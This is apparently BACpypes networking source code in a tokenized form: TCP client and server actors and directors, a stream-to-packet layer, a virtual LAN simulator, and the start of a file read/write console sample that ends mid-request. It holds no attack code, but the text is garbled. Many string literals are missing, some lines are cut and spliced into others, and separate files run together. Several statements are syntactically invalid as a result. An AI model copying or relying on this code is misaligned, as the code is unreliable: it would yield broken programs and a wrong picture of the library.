~~ def handle_connect ( self ) : \n 
~~~ if _debug : deferred ( TCPClient . _debug , "handle_connect" ) \n 
\n 
~~ def handle_expt ( self ) : \n 
~~~ pass \n 
\n 
~~ def readable ( self ) : \n 
~~~ return 1 \n 
\n 
~~ def handle_read ( self ) : \n 
~~~ if _debug : deferred ( TCPClient . _debug , "handle_read" ) \n 
\n 
try : \n 
~~~ msg = self . recv ( 65536 ) \n 
if _debug : deferred ( TCPClient . _debug , "    - received %d octets" , len ( msg ) ) \n 
self . socketError = None \n 
\n 
# no socket means it was closed \n 
if not self . socket : \n 
~~~ if _debug : deferred ( TCPClient . _debug , "    - socket was closed" ) \n 
~~ else : \n 
# sent the data upstream \n 
~~~ deferred ( self . response , PDU ( msg ) ) \n 
\n 
~~ ~~ except socket . error , err : \n 
~~~ if ( err . args [ 0 ] == 111 ) : \n 
~~~ deferred ( TCPClient . _error , "connection to %r refused" , self . peer ) \n 
~~ else : \n 
~~~ deferred ( TCPClient . _error , "TCPClient.handle_read socket error: %r" , err ) \n 
~~ self . socketError = err \n 
\n 
~~ ~~ def writable ( self ) : \n 
~~~ return ( len ( self . request ) != 0 ) \n 
\n 
~~ def handle_write ( self ) : \n 
~~~ if _debug : deferred ( TCPClient . _debug , "handle_write" ) \n 
\n 
try : \n 
~~~ sent = self . send ( self . request ) \n 
if _debug : deferred ( TCPClient . _debug , "    - sent %d octets, %d remaining" , sent , len ( self self . socketError = None \n 
\n 
self . request = self . request [ sent : ] \n 
~~ except socket . error , err : \n 
~~~ if ( err . args [ 0 ] == 111 ) : \n 
~~~ deferred ( TCPClient . _error , "connection to %r refused" , self . peer ) \n 
~~ else : \n 
~~~ deferred ( TCPClient . _error , "handle_write socket error: %s" , err ) \n 
~~ self . socketError = err \n 
\n 
~~ ~~ def handle_close ( self ) : \n 
~~~ if _debug : deferred ( TCPClient . _debug , "handle_close" ) \n 
\n 
# close the socket \n 
self . close ( ) \n 
\n 
# make sure other routines know the socket is closed \n 
self . socket = None \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ """Requests are queued for delivery.""" \n 
if _debug : TCPClient . _debug ( "indication %r" , pdu ) \n 
\n 
self . request += pdu . pduData \n 
\n 
~~ ~~ bacpypes_debugging ( TCPClient ) \n 
\n 
# \n 
#   TCPClientActor \n 
# \n 
#   Actors are helper objects for a director.  There is one actor for \n 
#   each connection. \n 
# \n 
\n 
class TCPClientActor ( TCPClient ) : \n 
\n 
~~~ def __init__ ( self , director , peer ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "__init__ %r %r" , director , peer ) \n 
TCPClient . __init__ ( self , peer ) \n 
\n 
# keep track of the director \n 
self . director = director \n 
\n 
# add a timer \n 
self . timeout = director . timeout \n 
if self . timeout > 0 : \n 
~~~ self . timer = FunctionTask ( self . idle_timeout ) \n 
self . timer . install_task ( _time ( ) + self . timeout ) \n 
~~ else : \n 
~~~ self . timer = None \n 
\n 
# this may have a flush state \n 
~~ self . flushTask = None \n 
\n 
# tell the director this is a new actor \n 
self . director . add_actor ( self ) \n 
\n 
~~ def handle_close ( self ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "handle_close" ) \n 
\n 
\n 
if self . flushTask : \n 
~~~ self . flushTask . suspend_task ( ) \n 
\n 
# cancel the timer \n 
~~ if self . timer : \n 
~~~ self . timer . suspend_task ( ) \n 
\n 
# tell the director this is gone \n 
~~ self . director . remove_actor ( self ) \n 
\n 
# pass the function along \n 
TCPClient . handle_close ( self ) \n 
\n 
~~ def idle_timeout ( self ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "idle_timeout" ) \n 
\n 
# shut it down \n 
self . handle_close ( ) \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "indication %r" , pdu ) \n 
\n 
# additional downstream data is tossed while flushing \n 
if self . flushTask : \n 
~~~ if _debug : TCPServerActor . _debug ( "    - flushing" ) \n 
return \n 
\n 
# reschedule the timer \n 
~~ if self . timer : \n 
~~~ self . timer . install_task ( _time ( ) + self . timeout ) \n 
\n 
# continue as usual \n 
~~ TCPClient . indication ( self , pdu ) \n 
\n 
~~ def response ( self , pdu ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "response %r" , pdu ) \n 
\n 
# put the peer address in as the source \n 
pdu . pduSource = self . peer \n 
\n 
# reschedule the timer \n 
if self . timer : \n 
~~~ self . timer . install_task ( _time ( ) + self . timeout ) \n 
\n 
# process this as a response from the director \n 
~~ self . director . response ( pdu ) \n 
\n 
~~ def flush ( self ) : \n 
~~~ if _debug : TCPClientActor . _debug ( "flush" ) \n 
\n 
# clear out the old task \n 
self . flushTask = None \n 
\n 
# if the outgoing buffer has data, re-schedule another attempt \n 
if self . request : \n 
~~~ self . flushTask = OneShotFunction ( self . flush ) \n 
return \n 
\n 
# close up shop, all done \n 
~~ self . handle_close ( ) \n 
\n 
~~ ~~ bacpypes_debugging ( TCPClientActor ) \n 
\n 
# \n 
#   TCPPickleClientActor \n 
# \n 
\n 
class TCPPickleClientActor ( PickleActorMixIn , TCPClientActor ) : \n 
~~~ pass \n 
\n 
# \n 
#   TCPClientDirector \n 
# \n 
#   A client director presents a connection pool as one virtual \n 
#   interface.  If a request should be sent to an address and there \n 
#   is no connection already established for it, it will create one \n 
\n 
#   so one is provided by the client actor. \n 
# \n 
\n 
~~ class TCPClientDirector ( Server , ServiceAccessPoint , DebugContents ) : \n 
\n 
~~~ _debug_contents = ( , , , ) \n 
\n 
def __init__ ( self , timeout = 0 , actorClass = TCPClientActor , sid = None , sapID = None ) : \n 
~~~ if _debug : TCPClientDirector . _debug ( "__init__ timeout=%r actorClass=%r sid=%r sapID=%r" , timeout Server . __init__ ( self , sid ) \n 
ServiceAccessPoint . __init__ ( self , sapID ) \n 
\n 
# check the actor class \n 
if not issubclass ( actorClass , TCPClientActor ) : \n 
~~~ raise TypeError ( "actorClass must be a subclass of TCPClientActor" ) \n 
~~ self . actorClass = actorClass \n 
\n 
# save the timeout for actors \n 
self . timeout = timeout \n 
\n 
# start with an empty client pool \n 
self . clients = { } \n 
\n 
# no clients automatically reconnecting \n 
self . reconnect = { } \n 
\n 
~~ def add_actor ( self , actor ) : \n 
~~~ """Add an actor when a new one is connected.""" \n 
if _debug : TCPClientDirector . _debug ( "add_actor %r" , actor ) \n 
\n 
self . clients [ actor . peer ] = actor \n 
\n 
# tell the ASE there is a new client \n 
if self . serviceElement : \n 
~~~ self . sap_request ( addPeer = actor . peer ) \n 
\n 
~~ ~~ def remove_actor ( self , actor ) : \n 
~~~ """Remove an actor when the socket is closed.""" \n 
if _debug : TCPClientDirector . _debug ( "remove_actor %r" , actor ) \n 
\n 
del self . clients [ actor . peer ] \n 
\n 
# tell the ASE the client has gone away \n 
if self . serviceElement : \n 
~~~ self . sap_request ( delPeer = actor . peer ) \n 
\n 
# see if it should be reconnected \n 
~~ if actor . peer in self . reconnect : \n 
~~~ connect_task = FunctionTask ( self . connect , actor . peer ) \n 
connect_task . install_task ( _time ( ) + self . reconnect [ actor . peer ] ) \n 
\n 
~~ ~~ def get_actor ( self , address ) : \n 
~~~ """ Get the actor associated with an address or None. """ \n 
return self . clients . get ( address , None ) \n 
\n 
~~ def connect ( self , address , reconnect = 0 ) : \n 
~~~ if _debug : TCPClientDirector . _debug ( "connect %r reconnect=%r" , address , reconnect ) \n 
if address in self . clients : \n 
~~~ return \n 
\n 
# create an actor, which will eventually call add_actor \n 
~~ client = self . actorClass ( self , address ) \n 
if _debug : TCPClientDirector . _debug ( "    - client: %r" , client ) \n 
\n 
# if it should automatically reconnect, save the timer value \n 
if reconnect : \n 
~~~ self . reconnect [ address ] = reconnect \n 
\n 
~~ ~~ def disconnect ( self , address ) : \n 
~~~ if _debug : TCPClientDirector . _debug ( "disconnect %r" , address ) \n 
if address not in self . clients : \n 
~~~ return \n 
\n 
\n 
~~ if address in self . reconnect : \n 
~~~ del self . reconnect [ address ] \n 
\n 
# close it \n 
~~ self . clients [ address ] . handle_close ( ) \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ """Direct this PDU to the appropriate server, create a\n        connection if one hasn\'t already been created.""" \n 
if _debug : TCPClientDirector . _debug ( "indication %r" , pdu ) \n 
\n 
# get the destination \n 
addr = pdu . pduDestination \n 
\n 
# get the client \n 
client = self . clients . get ( addr , None ) \n 
if not client : \n 
~~~ client = self . actorClass ( self , addr ) \n 
\n 
# send the message \n 
~~ client . indication ( pdu ) \n 
\n 
~~ ~~ bacpypes_debugging ( TCPClientDirector ) \n 
\n 
# \n 
#   TCPServer \n 
# \n 
\n 
class TCPServer ( asyncore . dispatcher ) : \n 
\n 
~~~ def __init__ ( self , sock , peer ) : \n 
~~~ if _debug : TCPServer . _debug ( "__init__ %r %r" , sock , peer ) \n 
asyncore . dispatcher . __init__ ( self , sock ) \n 
\n 
# save the peer \n 
self . peer = peer \n 
\n 
# create a request buffer \n 
self . request = \n 
\n 
# hold the socket error if there was one \n 
self . socketError = None \n 
\n 
~~ def handle_connect ( self ) : \n 
~~~ if _debug : deferred ( TCPServer . _debug , "handle_connect" ) \n 
\n 
~~ def readable ( self ) : \n 
~~~ return 1 \n 
\n 
~~ def handle_read ( self ) : \n 
~~~ if _debug : deferred ( TCPServer . _debug , "handle_read" ) \n 
\n 
try : \n 
~~~ msg = self . recv ( 65536 ) \n 
if _debug : deferred ( TCPServer . _debug , "    - received %d octets" , len ( msg ) ) \n 
self . socketError = None \n 
\n 
# no socket means it was closed \n 
if not self . socket : \n 
~~~ if _debug : deferred ( TCPServer . _debug , "    - socket was closed" ) \n 
~~ else : \n 
~~~ deferred ( self . response , PDU ( msg ) ) \n 
\n 
~~ ~~ except socket . error , err : \n 
~~~ if ( err . args [ 0 ] == 111 ) : \n 
~~~ deferred ( TCPServer . _error , "connection to %r refused" , self . peer ) \n 
~~ else : \n 
~~~ deferred ( TCPServer . _error , "handle_read socket error: %s" , err ) \n 
~~ self . socketError = err \n 
\n 
~~ ~~ def writable ( self ) : \n 
~~~ return ( len ( self . request ) != 0 ) \n 
\n 
~~ def handle_write ( self ) : \n 
~~~ if _debug : deferred ( TCPServer . _debug , "handle_write" ) \n 
\n 
try : \n 
~~~ sent = self . send ( self . request ) \n 
if _debug : deferred ( TCPServer . _debug , "    - sent %d octets, %d remaining" , sent , len ( self self . socketError = None \n 
\n 
self . request = self . request [ sent : ] \n 
~~ except socket . error , why : \n 
~~~ if ( why . args [ 0 ] == 111 ) : \n 
~~~ deferred ( TCPServer . _error , "connection to %r refused" , self . peer ) \n 
~~ else : \n 
~~~ deferred ( TCPServer . _error , "handle_write socket error: %s" , why ) \n 
~~ self . socketError = why \n 
\n 
~~ ~~ def handle_close ( self ) : \n 
~~~ if _debug : deferred ( TCPServer . _debug , "handle_close" ) \n 
\n 
if not self : \n 
~~~ deferred ( TCPServer . _warning , "handle_close: self is None" ) \n 
return \n 
~~ if not self . socket : \n 
~~~ deferred ( TCPServer . _warning , "handle_close: socket already closed" ) \n 
return \n 
\n 
~~ self . close ( ) \n 
self . socket = None \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ """Requests are queued for delivery.""" \n 
if _debug : TCPServer . _debug ( "indication %r" , pdu ) \n 
\n 
self . request += pdu . pduData \n 
\n 
~~ ~~ bacpypes_debugging ( TCPServer ) \n 
\n 
# \n 
#   TCPServerActor \n 
# \n 
\n 
class TCPServerActor ( TCPServer ) : \n 
\n 
~~~ def __init__ ( self , director , sock , peer ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "__init__ %r %r %r" , director , sock , peer ) \n 
TCPServer . __init__ ( self , sock , peer ) \n 
\n 
# keep track of the director \n 
self . director = director \n 
\n 
# add a timer \n 
self . timeout = director . timeout \n 
if self . timeout > 0 : \n 
~~~ self . timer = FunctionTask ( self . idle_timeout ) \n 
self . timer . install_task ( _time ( ) + self . timeout ) \n 
~~ else : \n 
~~~ self . timer = None \n 
\n 
# this may have a flush state \n 
~~ self . flushTask = None \n 
\n 
# tell the director this is a new actor \n 
self . director . add_actor ( self ) \n 
\n 
~~ def handle_close ( self ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "handle_close" ) \n 
\n 
\n 
if self . flushTask : \n 
~~~ self . flushTask . suspend_task ( ) \n 
\n 
# tell the director this is gone \n 
~~ self . director . remove_actor ( self ) \n 
\n 
# pass it down \n 
TCPServer . handle_close ( self ) \n 
\n 
~~ def idle_timeout ( self ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "idle_timeout" ) \n 
\n 
# shut it down \n 
self . handle_close ( ) \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "indication %r" , pdu ) \n 
\n 
# additional downstream data is tossed while flushing \n 
if self . flushTask : \n 
~~~ if _debug : TCPServerActor . _debug ( "    - flushing" ) \n 
return \n 
\n 
# reschedule the timer \n 
~~ if self . timer : \n 
~~~ self . timer . install_task ( _time ( ) + self . timeout ) \n 
\n 
# continue as usual \n 
~~ TCPServer . indication ( self , pdu ) \n 
\n 
~~ def response ( self , pdu ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "response %r" , pdu ) \n 
\n 
# upstream data is tossed while flushing \n 
if self . flushTask : \n 
~~~ if _debug : TCPServerActor . _debug ( "    - flushing" ) \n 
return \n 
\n 
# save the source \n 
~~ pdu . pduSource = self . peer \n 
\n 
# reschedule the timer \n 
if self . timer : \n 
~~~ self . timer . install_task ( _time ( ) + self . timeout ) \n 
\n 
# process this as a response from the director \n 
~~ self . director . response ( pdu ) \n 
\n 
~~ def flush ( self ) : \n 
~~~ if _debug : TCPServerActor . _debug ( "flush" ) \n 
\n 
# clear out the old task \n 
self . flushTask = None \n 
\n 
# if the outgoing buffer has data, re-schedule another attempt \n 
if self . request : \n 
~~~ self . flushTask = OneShotFunction ( self . flush ) \n 
return \n 
\n 
# close up shop, all done \n 
~~ self . handle_close ( ) \n 
\n 
~~ ~~ bacpypes_debugging ( TCPServerActor ) \n 
\n 
# \n 
#   TCPPickleServerActor \n 
# \n 
\n 
class TCPPickleServerActor ( PickleActorMixIn , TCPServerActor ) : \n 
~~~ pass \n 
\n 
# \n 
#   TCPServerDirector \n 
# \n 
\n 
~~ class TCPServerDirector ( asyncore . dispatcher , Server , ServiceAccessPoint , DebugContents ) : \n 
\n 
~~~ _debug_contents = ( , , , ) \n 
\n 
def __init__ ( self , address , listeners = 5 , timeout = 0 , reuse = False , actorClass = TCPServerActor , cid = ~~~ if _debug : \n 
~~~ TCPServerDirector . _debug ( "__init__ %r listeners=%r timeout=%r reuse=%r actorClass=%r cid=%r sapID=%r" , address , listeners , timeout , reuse , actorClass , cid , sapID \n 
) \n 
~~ Server . __init__ ( self , cid ) \n 
ServiceAccessPoint . __init__ ( self , sapID ) \n 
\n 
# save the address and timeout \n 
self . port = address \n 
self . timeout = timeout \n 
\n 
# check the actor class \n 
if not issubclass ( actorClass , TCPServerActor ) : \n 
~~~ raise TypeError ( "actorClass must be a subclass of TCPServerActor" ) \n 
~~ self . actorClass = actorClass \n 
\n 
# start with an empty pool of servers \n 
self . servers = { } \n 
\n 
# continue with initialization \n 
asyncore . dispatcher . __init__ ( self ) \n 
\n 
# create a listening port \n 
self . create_socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
if reuse : \n 
~~~ self . set_reuse_addr ( ) \n 
\n 
# try to bind, keep trying for a while if its already in use \n 
~~ hadBindErrors = False \n 
for i in range ( 30 ) : \n 
~~~ try : \n 
~~~ self . bind ( address ) \n 
break \n 
~~ except socket . error , err : \n 
~~~ hadBindErrors = True \n 
TCPServerDirector . _warning ( , err ) \n 
_sleep ( REBIND_SLEEP_INTERVAL ) \n 
~~ ~~ else : \n 
~~~ TCPServerDirector . _error ( ) \n 
raise RuntimeError ( "unable to bind" ) \n 
\n 
# if there were some bind errors, generate a meesage that all is OK now \n 
~~ if hadBindErrors : \n 
~~~ TCPServerDirector . _info ( ) \n 
\n 
~~ self . listen ( listeners ) \n 
\n 
~~ def handle_accept ( self ) : \n 
~~~ if _debug : TCPServerDirector . _debug ( "handle_accept" ) \n 
\n 
try : \n 
~~~ client , addr = self . accept ( ) \n 
~~ except socket . error : \n 
~~~ TCPServerDirector . _warning ( ) \n 
return \n 
~~ except TypeError : \n 
~~~ TCPServerDirector . _warning ( ) \n 
return \n 
~~ if _debug : TCPServerDirector . _debug ( "    - connection %r, %r" , client , addr ) \n 
\n 
# create a server \n 
server = self . actorClass ( self , client , addr ) \n 
\n 
# add it to our pool \n 
self . servers [ addr ] = server \n 
\n 
# return it to the dispatcher \n 
return server \n 
\n 
~~ def handle_close ( self ) : \n 
~~~ if _debug : TCPServerDirector . _debug ( "handle_close" ) \n 
\n 
# close the socket \n 
self . close ( ) \n 
\n 
~~ def add_actor ( self , actor ) : \n 
~~~ if _debug : TCPServerDirector . _debug ( "add_actor %r" , actor ) \n 
\n 
self . servers [ actor . peer ] = actor \n 
\n 
# tell the ASE there is a new server \n 
if self . serviceElement : \n 
~~~ self . sap_request ( addPeer = actor . peer ) \n 
\n 
~~ ~~ def remove_actor ( self , actor ) : \n 
~~~ if _debug : TCPServerDirector . _debug ( "remove_actor %r" , actor ) \n 
\n 
try : \n 
~~~ del self . servers [ actor . peer ] \n 
~~ except KeyError : \n 
~~~ TCPServerDirector . _warning ( "remove_actor: %r not an actor" , actor ) \n 
\n 
# tell the ASE the server has gone away \n 
~~ if self . serviceElement : \n 
~~~ self . sap_request ( delPeer = actor . peer ) \n 
\n 
~~ ~~ def get_actor ( self , address ) : \n 
~~~ """ Get the actor associated with an address or None. """ \n 
return self . servers . get ( address , None ) \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ """Direct this PDU to the appropriate server.""" \n 
if _debug : TCPServerDirector . _debug ( "indication %r" , pdu ) \n 
\n 
# get the destination \n 
addr = pdu . pduDestination \n 
\n 
# get the server \n 
server = self . servers . get ( addr , None ) \n 
if not server : \n 
~~~ raise RuntimeError ( "not a connected server" ) \n 
\n 
# pass the indication to the actor \n 
~~ server . indication ( pdu ) \n 
\n 
~~ ~~ bacpypes_debugging ( TCPServerDirector ) \n 
\n 
# \n 
#   StreamToPacket \n 
# \n 
\n 
class StreamToPacket ( Client , Server ) : \n 
\n 
~~~ def __init__ ( self , fn , cid = None , sid = None ) : \n 
~~~ if _debug : StreamToPacket . _debug ( "__init__ %r cid=%r, sid=%r" , fn , cid , sid ) \n 
Client . __init__ ( self , cid ) \n 
Server . __init__ ( self , sid ) \n 
\n 
# save the packet function \n 
self . packetFn = fn \n 
\n 
# start with an empty set of buffers \n 
self . upstreamBuffer = { } \n 
self . downstreamBuffer = { } \n 
\n 
~~ def packetize ( self , pdu , streamBuffer ) : \n 
~~~ if _debug : StreamToPacket . _debug ( "packetize %r ..." , pdu ) \n 
\n 
def chop ( addr ) : \n 
~~~ if _debug : StreamToPacket . _debug ( "chop %r" , addr ) \n 
\n 
# get the current downstream buffer \n 
buff = streamBuffer . get ( addr , ) + pdu . pduData \n 
if _debug : StreamToPacket . _debug ( "    - buff: %r" , buff ) \n 
\n 
# look for a packet \n 
while 1 : \n 
~~~ packet = self . packetFn ( buff ) \n 
if packet is None : \n 
~~~ break \n 
\n 
~~ yield PDU ( packet [ 0 ] , \n 
source = pdu . pduSource , \n 
destination = pdu . pduDestination , \n 
user_data = pdu . pduUserData , \n 
) \n 
buff = packet [ 1 ] \n 
\n 
\n 
~~ streamBuffer [ addr ] = buff \n 
\n 
# buffer related to the addresses \n 
~~ if pdu . pduSource : \n 
~~~ for pdu in chop ( pdu . pduSource ) : \n 
~~~ yield pdu \n 
~~ ~~ if pdu . pduDestination : \n 
~~~ for pdu in chop ( pdu . pduDestination ) : \n 
~~~ yield pdu \n 
\n 
~~ ~~ ~~ def indication ( self , pdu ) : \n 
~~~ """Message going downstream.""" \n 
if _debug : StreamToPacket . _debug ( "indication %r" , pdu ) \n 
\n 
# hack it up into chunks \n 
for packet in self . packetize ( pdu , self . downstreamBuffer ) : \n 
~~~ self . request ( packet ) \n 
\n 
~~ ~~ def confirmation ( self , pdu ) : \n 
~~~ """Message going upstream.""" \n 
if _debug : StreamToPacket . _debug ( "StreamToPacket.confirmation %r" , pdu ) \n 
\n 
# hack it up into chunks \n 
for packet in self . packetize ( pdu , self . upstreamBuffer ) : \n 
~~~ self . response ( packet ) \n 
\n 
~~ ~~ ~~ bacpypes_debugging ( StreamToPacket ) \n 
\n 
# \n 
#   StreamToPacketSAP \n 
# \n 
\n 
class StreamToPacketSAP ( ApplicationServiceElement , ServiceAccessPoint ) : \n 
\n 
~~~ def __init__ ( self , stp , aseID = None , sapID = None ) : \n 
~~~ if _debug : StreamToPacketSAP . _debug ( "__init__ %r aseID=%r, sapID=%r" , stp , aseID , sapID ) \n 
ApplicationServiceElement . __init__ ( self , aseID ) \n 
ServiceAccessPoint . __init__ ( self , sapID ) \n 
\n 
# save a reference to the StreamToPacket object \n 
self . stp = stp \n 
\n 
~~ def indication ( self , addPeer = None , delPeer = None ) : \n 
~~~ if _debug : StreamToPacketSAP . _debug ( "indication addPeer=%r delPeer=%r" , addPeer , delPeer ) \n 
\n 
if addPeer : \n 
# create empty buffers associated with the peer \n 
~~~ self . stp . upstreamBuffer [ addPeer ] = \n 
self . stp . downstreamBuffer [ addPeer ] = \n 
\n 
~~ if delPeer : \n 
# delete the buffer contents associated with the peer \n 
~~~ del self . stp . upstreamBuffer [ delPeer ] \n 
del self . stp . downstreamBuffer [ delPeer ] \n 
\n 
# chain this along \n 
~~ if self . serviceElement : \n 
~~~ self . sap_request ( addPeer = addPeer , delPeer = delPeer ) \n 
\n 
~~ ~~ ~~ bacpypes_debugging ( StreamToPacketSAP ) \n 
#!/usr/bin/python \n 
\n 
"""\nVirtual Local Area Network\n""" \n 
\n 
import random \n 
from copy import deepcopy \n 
\n 
from . errors import ConfigurationError \n 
from . debugging import ModuleLogger , bacpypes_debugging \n 
\n 
from . core import deferred \n 
from . pdu import Address \n 
from . comm import Server \n 
\n 
# some debugging \n 
_debug = 0 \n 
_log = ModuleLogger ( globals ( ) ) \n 
\n 
# \n 
#   Network \n 
# \n 
\n 
@ bacpypes_debugging \n 
class Network : \n 
\n 
~~~ def __init__ ( self , dropPercent = 0.0 ) : \n 
~~~ if _debug : Network . _debug ( "__init__ dropPercent=%r" , dropPercent ) \n 
\n 
self . nodes = [ ] \n 
self . dropPercent = dropPercent \n 
\n 
~~ def add_node ( self , node ) : \n 
~~~ """ Add a node to this network, let the node know which network it\'s on. """ \n 
if _debug : Network . _debug ( "add_node %r" , node ) \n 
\n 
self . nodes . append ( node ) \n 
node . lan = self \n 
\n 
~~ def remove_node ( self , node ) : \n 
~~~ """ Remove a node from this network. """ \n 
if _debug : Network . _debug ( "remove_node %r" , node ) \n 
\n 
self . nodes . remove ( node ) \n 
node . lan = None \n 
\n 
~~ def process_pdu ( self , pdu ) : \n 
~~~ """ Process a PDU by sending a copy to each node as dictated by the\n            addressing and if a node is promiscuous.\n        """ \n 
if _debug : Network . _debug ( "process_pdu %r" , pdu ) \n 
\n 
if self . dropPercent != 0.0 : \n 
~~~ if ( random . random ( ) * 100.0 ) < self . dropPercent : \n 
~~~ if _debug : Network . _debug ( "    - packet dropped" ) \n 
return \n 
\n 
~~ ~~ if not pdu . pduDestination or not isinstance ( pdu . pduDestination , Address ) : \n 
~~~ raise RuntimeError ( "invalid destination address" ) \n 
\n 
~~ elif pdu . pduDestination . addrType == Address . localBroadcastAddr : \n 
~~~ for n in self . nodes : \n 
~~~ if ( pdu . pduSource != n . address ) : \n 
~~~ n . response ( deepcopy ( pdu ) ) \n 
\n 
~~ ~~ ~~ elif pdu . pduDestination . addrType == Address . localStationAddr : \n 
~~~ for n in self . nodes : \n 
~~~ if n . promiscuous or ( pdu . pduDestination == n . address ) : \n 
~~~ n . response ( deepcopy ( pdu ) ) \n 
\n 
~~ ~~ ~~ else : \n 
~~~ raise RuntimeError ( "invalid destination address type" ) \n 
\n 
~~ ~~ def __len__ ( self ) : \n 
~~~ """ Simple way to determine the number of nodes in the network. """ \n 
if _debug : Network . _debug ( "__len__" ) \n 
return len ( self . nodes ) \n 
\n 
# \n 
#   Node \n 
# \n 
\n 
~~ ~~ @ bacpypes_debugging \n 
class Node ( Server ) : \n 
\n 
~~~ def __init__ ( self , addr , lan = None , promiscuous = False , spoofing = False , sid = None ) : \n 
~~~ if _debug : \n 
~~~ Node . _debug ( "__init__ %r lan=%r promiscuous=%r spoofing=%r sid=%r" , \n 
addr , lan , promiscuous , spoofing , sid \n 
) \n 
~~ Server . __init__ ( self , sid ) \n 
\n 
if not isinstance ( addr , Address ) : \n 
~~~ raise TypeError ( "addr must be an address" ) \n 
\n 
~~ self . lan = None \n 
self . address = addr \n 
\n 
# bind to a lan if it was provided \n 
if lan : \n 
~~~ self . bind ( lan ) \n 
\n 
# might receive all packets and might spoof \n 
~~ self . promiscuous = promiscuous \n 
self . spoofing = spoofing \n 
\n 
~~ def bind ( self , lan ) : \n 
~~~ """bind to a LAN.""" \n 
if _debug : Node . _debug ( "bind %r" , lan ) \n 
\n 
lan . add_node ( self ) \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ """Send a message.""" \n 
if _debug : Node . _debug ( "indication %r" , pdu ) \n 
\n 
\n 
if not self . lan : \n 
~~~ raise ConfigurationError ( "unbound node" ) \n 
\n 
# if the pduSource is unset, fill in our address, otherwise \n 
# leave it alone to allow for simulated spoofing \n 
~~ if pdu . pduSource is None : \n 
~~~ pdu . pduSource = self . address \n 
~~ elif ( not self . spoofing ) and ( pdu . pduSource != self . address ) : \n 
~~~ raise RuntimeError ( "spoofing address conflict" ) \n 
\n 
# actual network delivery is deferred \n 
~~ deferred ( self . lan . process_pdu , pdu ) \n 
#!/usr/bin/python \n 
\n 
~~ ~~ """\nReadWriteFile.py\n\nThis application presents a \'console\' prompt to the user asking for commands.\n\nThe \'readrecord\' and \'writerecord\' commands are used with record oriented files,\nand the \'readstream\' and \'writestream\' commands are used with stream oriented \nfiles.\n""" \n 
\n 
import sys \n 
\n 
from bacpypes . debugging import bacpypes_debugging , ModuleLogger \n 
from bacpypes . consolelogging import ConfigArgumentParser \n 
from bacpypes . consolecmd import ConsoleCmd \n 
\n 
from bacpypes . core import run \n 
\n 
from bacpypes . pdu import Address \n 
from bacpypes . app import LocalDeviceObject , BIPSimpleApplication \n 
\n 
from bacpypes . apdu import Error , AbortPDU , AtomicReadFileRequest , AtomicReadFileRequestAccessMethodChoice , AtomicReadFileRequestAccessMethodChoiceRecordAccess , AtomicReadFileRequestAccessMethodChoiceStreamAccess , AtomicReadFileACK , AtomicWriteFileRequest , AtomicWriteFileRequestAccessMethodChoice , AtomicWriteFileRequestAccessMethodChoiceRecordAccess , AtomicWriteFileRequestAccessMethodChoiceStreamAccess , AtomicWriteFileACK \n 
from bacpypes . basetypes import ServicesSupported \n 
\n 
# some debugging \n 
_debug = 0 \n 
_log = ModuleLogger ( globals ( ) ) \n 
\n 
# reference a simple application \n 
this_application = None \n 
\n 
# \n 
#   TestApplication \n 
# \n 
\n 
@ bacpypes_debugging \n 
class TestApplication ( BIPSimpleApplication ) : \n 
\n 
~~~ def request ( self , apdu ) : \n 
~~~ if _debug : TestApplication . _debug ( "request %r" , apdu ) \n 
\n 
# save a copy of the request \n 
self . _request = apdu \n 
\n 
# forward it along \n 
BIPSimpleApplication . request ( self , apdu ) \n 
\n 
~~ def confirmation ( self , apdu ) : \n 
~~~ if _debug : TestApplication . _debug ( "confirmation %r" , apdu ) \n 
\n 
if isinstance ( apdu , Error ) : \n 
~~~ sys . stdout . write ( "error: %s\\n" % ( apdu . errorCode , ) ) \n 
sys . stdout . flush ( ) \n 
\n 
~~ elif isinstance ( apdu , AbortPDU ) : \n 
~~~ apdu . debug_contents ( ) \n 
\n 
~~ elif ( isinstance ( self . _request , AtomicReadFileRequest ) ) and ( isinstance ( apdu , AtomicReadFileACK # suck out the record data \n 
~~~ if apdu . accessMethod . recordAccess : \n 
~~~ value = apdu . accessMethod . recordAccess . fileRecordData \n 
~~ elif apdu . accessMethod . streamAccess : \n 
~~~ value = apdu . accessMethod . streamAccess . fileData \n 
~~ TestApplication . _debug ( "    - value: %r" , value ) \n 
\n 
sys . stdout . write ( repr ( value ) + ) \n 
sys . stdout . flush ( ) \n 
\n 
~~ elif ( isinstance ( self . _request , AtomicWriteFileRequest ) ) and ( isinstance ( apdu , AtomicWriteFileACK # suck out the record data \n 
~~~ if apdu . fileStartPosition is not None : \n 
~~~ value = apdu . fileStartPosition \n 
~~ elif apdu . fileStartRecord is not None : \n 
~~~ value = apdu . fileStartRecord \n 
~~ TestApplication . _debug ( "    - value: %r" , value ) \n 
\n 
sys . stdout . write ( repr ( value ) + ) \n 
sys . stdout . flush ( ) \n 
\n 
# \n 
#   TestConsoleCmd \n 
# \n 
\n 
~~ ~~ ~~ @ bacpypes_debugging \n 
class TestConsoleCmd ( ConsoleCmd ) : \n 
\n 
~~~ def do_readrecord ( self , args ) : \n 
~~~ """readrecord <addr> <inst> <start> <count>""" \n 
args = args . split ( ) \n 
if _debug : TestConsoleCmd . _debug ( "do_readrecord %r" , args ) \n 
\n 
try : \n 
~~~ addr , obj_inst , start_record , record_count = args \n 
\n 
obj_type = \n 
obj_inst = int ( obj_inst ) \n 
start_record = int ( start_record ) \n 
record_count = int ( record_count ) \n 
\n 
# build a request \n 
request = AtomicReadFileRequest ( \n 
fileIdentifier = ( obj_type , obj_inst ) , \n 
accessMethod = AtomicReadFileRequestAccessMethodChoice ( \n 
recordAccess = AtomicReadFileRequestAccessMethodChoiceRecordAccess ( \n 
fileStartRecord = start_record , \n 
requestedRecordCount = record_count , \n 
) , \n 
